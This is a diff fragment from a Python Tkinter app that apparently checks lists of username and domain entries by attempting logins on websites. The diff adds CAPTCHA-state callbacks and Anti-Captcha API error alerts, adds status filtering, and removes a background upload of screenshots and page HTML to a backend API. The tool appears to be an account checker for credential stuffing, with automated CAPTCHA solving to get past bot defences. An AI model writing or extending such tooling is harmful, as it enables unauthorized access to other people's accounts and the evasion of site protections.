+                        ("update", entry["_abs_idx"], entry, f"CAPTCHA_STATE_{state}: {stage}")
+                    )
                 try:
                     entry_login_url = self._resolve_login_url_for_entry(
                         entry,
                         default_login_url=login_url_snap,
-                        domain_map=login_url_map_snap,
                     )
                     dom_cfg = self._resolve_dom_settings_for_entry(entry)
                     # ── Fast Hostpoint batch path ─────────────────────────
@@ -3777,6 +2786,7 @@ class App(tk.Tk):
                                 custom_cookie_dom=dom_cfg["cookie"],
                                 custom_login_trigger_dom=dom_cfg["login_trigger"],
                                 custom_login_tab_dom=dom_cfg["login_tab"],
+                                captcha_state_cb=_on_captcha_state,
                             )
                         else:
                             status, screenshot = try_login_interactive(
@@ -3793,16 +2803,15 @@ class App(tk.Tk):
                                 custom_cookie_dom=dom_cfg["cookie"],
                                 custom_login_trigger_dom=dom_cfg["login_trigger"],
                                 custom_login_tab_dom=dom_cfg["login_tab"],
+                                captcha_state_cb=_on_captcha_state,
                             )
                 except Exception as exc:
                     status = f"ERROR: {exc}"
                     screenshot = None
-                html = get_last_page_html() if screenshot is not None else None
                 if self._stop_flag.is_set():
                     status = "Stopped"
                     screenshot = None
-                    html = None
-                return entry, status, screenshot, html
+                return entry, status, screenshot
 
             # ── Collect entries to check ──────────────────────────────────
             # Build list: file entries first, then manual entries.
@@ -3835,7 +2844,8 @@ class App(tk.Tk):
                                 raw.decode("utf-8", errors="ignore"))
                             if entry is None:
                                 continue
-                            if not _passes(entry):   # status filter (not in cache)
+                            status = results_snap.get(abs_idx, "Pending")
+                            if not _passes(entry, status):
                                 continue
                             entry["_abs_idx"] = abs_idx
                             entries_to_check.append(entry)
@@ -3851,7 +2861,8 @@ class App(tk.Tk):
                                 raw.decode("utf-8", errors="ignore"))
                             if entry is None:
                                 continue
-                            if not _passes(entry):
+                            status = results_snap.get(abs_idx, "Pending")
+                            if not _passes(entry, status):
                                 continue
                             entry["_abs_idx"] = abs_idx
                             entries_to_check.append(entry)
@@ -3865,16 +2876,20 @@ class App(tk.Tk):
                                 continue
                             current_idx = abs_idx
                             abs_idx += 1
-                            if not _passes(entry):
+                            status = results_snap.get(current_idx, "Pending")
+                            if not _passes(entry, status):
                                 continue
                             entry["_abs_idx"] = current_idx
                             if start_idx >= 0 and current_idx < start_idx:
                                 continue
                             entries_to_check.append(entry)
 
-            # Manual entries always included (negative abs_idx)
+            # Manual entries are included only if they pass active filters.
             for me in list(self._manual_entries):
-                if not self._stop_flag.is_set():
+                if self._stop_flag.is_set():
+                    break
+                me_status = results_snap.get(me.get("_abs_idx"), me.get("status", "Pending"))
+                if _passes(me, me_status):
                     entries_to_check.append(me)
 
             if self._group_by_domain_var.get() and entries_to_check:
@@ -3945,15 +2960,14 @@ class App(tk.Tk):
                         if entry is None:
                             continue
                         try:
-                            done_entry, status, screenshot, html = fut.result()
+                            done_entry, status, screenshot = fut.result()
                         except Exception as exc:
                             done_entry = entry
                             status = f"ERROR: {exc}"
                             screenshot = None
-                            html = None
 
                         self._result_queue.put(
-                            ("update", done_entry["_abs_idx"], done_entry, status, screenshot, html)
+                            ("update", done_entry["_abs_idx"], done_entry, status, screenshot)
                         )
 
         except Exception as e:
@@ -3969,7 +2983,6 @@ class App(tk.Tk):
                 item = self._result_queue.get_nowait()
                 msg, idx, row, status = item[0], item[1], item[2], item[3]
                 screenshot = item[4] if len(item) > 4 else None
-                html       = item[5] if len(item) > 5 else None
 
                 if msg == "done":
                     self._check_done()
@@ -3984,11 +2997,20 @@ class App(tk.Tk):
                     continue
                 if msg == "update":
                     # "Checking…" is a live-status notification, not a final result
-                    is_interim = status.startswith("Checking")
+                    is_interim = (
+                        status.startswith("Checking")
+                        or status.startswith("CAPTCHA_STATE_")
+                    )
 
                     if not is_interim:
                         self._done_jobs += 1
                         self._results[idx] = status
+                        if (
+                            "anti-captcha api:" in status.lower()
+                            and status not in self._anti_captcha_alerted_messages
+                        ):
+                            self._anti_captcha_alerted_messages.add(status)
+                            messagebox.showerror("Anti-Captcha API error", status)
                         # Update manual entry status in its dict too
                         if idx < 0:
                             for me in self._manual_entries:
@@ -4046,13 +3068,6 @@ class App(tk.Tk):
                             })
                             self._checker_screenshot_map[idx] = screenshot
                             self._btn_view_screenshots.config(state="normal")
-                            # Upload to backend API (non-blocking)
-                            if self._api_upload_var.get():
-                                threading.Thread(
-                                    target=self._upload_screenshot,
-                                    args=(row, screenshot, status, html),
-                                    daemon=True,
-                                ).start()
                             # Update 📷 column in tree row immediately
                             _ss_iid = str(idx)
                             if self._tree.exists(_ss_iid):
@@ -4069,9 +3084,14 @@ class App(tk.Tk):
                     if is_visible and row:
                         self._update_tree_row(idx, row, status)
                         if is_interim:
-                            self._statusbar.config(
-                                text=f"Checking: {row.get('username','')}  @  {row.get('domain','')}"
-                            )
+                            if status.startswith("CAPTCHA_STATE_"):
+                                self._statusbar.config(
+                                    text=f"{status} — {row.get('username','')}  @  {row.get('domain','')}"
+                                )
+                            else:
+                                self._statusbar.config(
+                                    text=f"Checking: {row.get('username','')}  @  {row.get('domain','')}"
+                                )
 
                     processed += 1
         except queue.Empty:
